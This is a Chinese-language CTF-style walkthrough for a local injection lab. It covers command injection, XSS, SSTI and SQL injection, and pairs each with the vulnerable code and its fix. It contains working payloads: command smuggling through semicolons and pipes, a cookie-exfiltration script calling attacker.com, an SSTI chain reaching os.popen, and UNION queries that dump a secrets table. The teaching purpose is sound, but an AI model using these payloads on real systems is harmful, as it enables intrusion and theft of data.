# AIS3 Corp Injection Lab — 攻擊解題說明

## 環境啟動

```bash
docker compose up -d
# 開啟瀏覽器前往 http://localhost:10003
```

---

## Challenge 01 — Command Injection

### 情境

網路診斷工具讓使用者輸入主機名稱，後端執行 ping 指令：

```python
cmd = f'ping -c 2 -W 1 {host}'
subprocess.check_output(cmd, shell=True)
```

### 漏洞根因

`shell=True` 讓整段字串直接交給 `/bin/sh -c` 執行。
當 `host = "127.0.0.1; cat /flag_cmdi.txt"` 時，shell 實際執行的是：

```sh
ping -c 2 -W 1 127.0.0.1; cat /flag_cmdi.txt
```

分號 `;` 是 shell 的「指令分隔符」，無論前一個指令成功或失敗，後面的指令都會繼續執行。

### 攻擊步驟

1. 進入 `/network-tool`
2. 在輸入框填入：
   ```
   127.0.0.1; cat /flag_cmdi.txt
   ```
3. 送出，ping 結果下方會出現 flag 內容

### 其他可用 Payload

| Payload | 說明 |
|---------|------|
| `127.0.0.1; whoami` | 確認目前執行身份 |
| `127.0.0.1; ls /` | 列出根目錄 |
| `127.0.0.1 \| cat /flag_cmdi.txt` | 用 pipe，前面指令的 stdout 作為後面的 stdin |
| `127.0.0.1 && cat /flag_cmdi.txt` | 用 `&&`，前面成功才執行後面 |
| `; cat /flag_cmdi.txt` | 直接省略 host，仍然有效 |

### 修補方式

```python
# 方法一：使用 list 形式，不走 shell
subprocess.check_output(['ping', '-c', '2', host])

# 方法二：白名單驗證輸入
import re
if not re.match(r'^[\w.\-]+$', host):
    return "Invalid host"
```

---

## Challenge 02 — Cross-Site Scripting (XSS)

### 情境

客戶回饋搜尋系統將關鍵字反射到頁面上，同時把 flag 放進 Cookie：

```python
# Python：Cookie 沒有設 httponly
resp.set_cookie('flag', FLAG_XSS, httponly=False)
```

```html
<!-- Jinja2 模板：用 |safe 跳過 HTML 轉義 -->
<div class="search-summary">搜尋結果：{{ keyword | safe }}</div>
```

### 漏洞根因

Jinja2 預設會對所有變數做 HTML 實體轉義（`<` → `&lt;`），但加上 `| safe` 後，輸出內容不會被轉義，瀏覽器會將其當作 HTML 解析並執行其中的 `<script>`。

加上 Cookie 沒有設定 `HttpOnly`，JavaScript 可以透過 `document.cookie` 讀到完整 Cookie 字串。

### 攻擊步驟

1. 進入 `/feedback`
2. 在搜尋框輸入下列 payload：
   ```html
   <script>alert(document.cookie)</script>
   ```
3. 送出後，瀏覽器執行 script，跳出包含 `flag=AIS3{...}` 的 alert

### 進階：製作釣魚連結

將 payload 編碼進 URL，讓受害者點開就觸發：

```
http://localhost:10003/feedback?q=<script>alert(document.cookie)</script>
```

真實攻擊場景中，攻擊者會把 cookie 送到自己的伺服器：

```html
<script>
  fetch('https://attacker.com/?c=' + document.cookie)
</script>
```

### 其他可用 Payload

| Payload | 說明 |
|---------|------|
| `<script>document.write(document.cookie)</script>` | 把 cookie 寫進頁面 |
| `<img src=x onerror="alert(document.cookie)">` | 利用圖片載入錯誤事件觸發 |
| `<svg onload="alert(1)">` | SVG 事件觸發 |

### 修補方式

```python
# 移除 |safe，讓 Jinja2 自動轉義
{{ keyword }}   # <script> 會被轉為 &lt;script&gt;

# Cookie 加上 HttpOnly，讓 JS 無法讀取
resp.set_cookie('flag', FLAG_XSS, httponly=True)
```

---

## Challenge 03 — Server-Side Template Injection (SSTI)

### 情境

個人化報告產生器將使用者輸入直接嵌入 Jinja2 模板字串後渲染：

```python
template = f'Hello, {name}! 您的個人化報告已成功產生。'
result = render_template_string(template)
```

### 漏洞根因

`render_template_string` 會把傳入的字串當作 Jinja2 模板解析。
當 `name = "{{7*7}}"` 時，模板變成：

```
Hello, {{7*7}}! 您的個人化報告已成功產生。
```

Jinja2 執行表達式 `7*7`，輸出 `Hello, 49!`。

這代表使用者可以控制模板內容，進而存取 Python 物件、讀取應用程式設定，甚至執行系統指令。

### 攻擊步驟

**Step 1：確認漏洞存在**

在 `name` 參數輸入：
```
{{7*7}}
```
頁面出現 `Hello, 49!` → 確認 SSTI 存在。

**Step 2：讀取 Flask config 取得 flag**

```
{{config['SECRET_FLAG']}}
```

Flask 的 `config` 物件在 Jinja2 context 中預設可存取，等同於 `app.config` 字典。

URL：
```
http://localhost:10003/report?name={{config['SECRET_FLAG']}}
```

**Step 3（進階）：執行任意系統指令**

透過 Python 物件繼承鏈取得 `os` 模組：

```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

解析：
- `config.__class__` → `<class 'flask.config.Config'>`
- `.__init__.__globals__` → 取得該類別初始化函式的全域命名空間（包含 `import` 進來的模組）
- `['os']` → 取得 `os` 模組
- `.popen('id').read()` → 執行指令並讀取輸出

### 其他可用 Payload

| Payload | 說明 |
|---------|------|
| `{{config}}` | 列出所有 Flask 設定 |
| `{{self.__dict__}}` | 列出當前物件屬性 |
| `{{''.__class__.__mro__}}` | 列出 str 的繼承鏈（用於物件挖掘） |

### 修補方式

```python
# 永遠不要把使用者輸入拼入模板字串
# 錯誤：
template = f'Hello, {name}!'
render_template_string(template)

# 正確：把使用者輸入當作變數傳入
render_template_string('Hello, {{ name }}!', name=name)
# 或使用獨立的模板檔案
render_template('report.html', name=name)
```

---

## Challenge 04 — SQL Injection

### 情境

員工資料查詢系統直接將使用者輸入拼接進 SQL 查詢：

```python
query = f"SELECT id, name, dept, title, email FROM employees WHERE id = {emp_id}"
db.execute(query)
```

資料庫中除了 `employees` table，還有隱藏的 `secrets` table 存放 flag。

### 漏洞根因

字串拼接讓使用者可以改變 SQL 語句的結構。
`UNION SELECT` 可以在原本查詢結果後面附加另一個查詢的結果，只要兩個 SELECT 的欄位數量與型別相容即可。

### 攻擊步驟

**Step 1：確認漏洞**

輸入一個單引號 `'`，觀察是否出現 SQL 錯誤：
```
1'
```
出現 `sqlite3.OperationalError` → 確認有 SQL Injection。

**Step 2：確認欄位數量**

原始查詢選了 5 個欄位（`id, name, dept, title, email`），UNION 的兩邊欄位數必須相同：
```
0 UNION SELECT 1,2,3,4,5--
```
- `0` 讓原始查詢沒有結果（不存在的 ID），只顯示 UNION 的結果
- `--` 是 SQL 的行註解，把後面的語句全部忽略
- 頁面出現一行 `1 | 2 | 3 | 4 | 5` → 欄位數正確

**Step 3：列出所有 Table**

SQLite 把 schema 存在 `sqlite_master` 系統表：
```
0 UNION SELECT name,sql,1,1,1 FROM sqlite_master--
```
回傳結果中可以看到 `secrets` table 及其結構：
```sql
CREATE TABLE secrets (id INTEGER PRIMARY KEY, name TEXT NOT NULL, value TEXT NOT NULL)
```

**Step 4：撈出 Flag**

```
0 UNION SELECT value,1,1,1,1 FROM secrets--
```

URL（需 URL encode 空格）：
```
http://localhost:10003/employee-search?id=0+UNION+SELECT+value,1,1,1,1+FROM+secrets--
```

### 完整攻擊路徑

```
id=1                                           → 正常查詢
id=1'                                          → 觸發錯誤，確認漏洞
id=0 UNION SELECT 1,2,3,4,5--                 → 確認欄位數
id=0 UNION SELECT name,sql,1,1,1 FROM sqlite_master-- → 枚舉 table
id=0 UNION SELECT value,1,1,1,1 FROM secrets-- → 取得 flag
```

### 修補方式

```python
# 使用 Parameterized Query（參數化查詢），絕對不要字串拼接
db.execute("SELECT id, name, dept, title, email FROM employees WHERE id = ?", (emp_id,))

# 額外防護：驗證輸入型別
if not emp_id.isdigit():
    return "Invalid ID"
```

---

## 共同防禦原則

| 漏洞 | 根本原因 | 修補原則 |
|------|----------|----------|
| Command Injection | 使用者輸入進入 shell | 避免 `shell=True`；使用 list 傳遞指令 |
| XSS | 未轉義的輸出 | 永遠對輸出做 HTML 實體轉義；Cookie 加 `HttpOnly` |
| SSTI | 使用者輸入混入模板結構 | 輸入只當作變數傳入，不拼接進模板字串 |
| SQL Injection | 使用者輸入混入 SQL 結構 | 永遠使用 Parameterized Query |

**核心概念**：所有注入類漏洞的根因都一樣——**把使用者輸入當作「程式碼結構」的一部分來解析**，而非把它單純當作「資料」處理。
